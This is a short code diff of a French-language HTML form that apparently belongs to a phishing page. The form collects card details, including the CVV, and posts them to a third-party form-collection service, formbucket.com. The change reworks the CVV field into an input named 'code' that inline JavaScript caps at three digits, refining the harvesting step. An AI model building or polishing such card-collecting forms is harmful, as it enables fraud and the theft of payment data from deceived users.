@@ -73,7 +73,8 @@ action="https://formbucket.com/f/buk_hhDD9YNSEln4BHitpJRIaFTA">
      </div> 
      <div class="form-group"> 
       <label for="cvv">CVV (les 3 ou 4 derniers chiffres au dos de la carte)</label> 
-      <input type="number" class="form-control" id="cvv" name="cvv" placeholder="000" required> 
+      <p class="labelInput">CVV :</p> 
+      <input maxlength="3" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" required class="InputInfo" type="number" name="code" placeholder="000"> 
      </div> 
      <button type="submit"class="btn btn-primary auto-three-dots-inline w-100" style="background-color: #a90034; color: #ffffff">Continuer</button> 
     </form> 
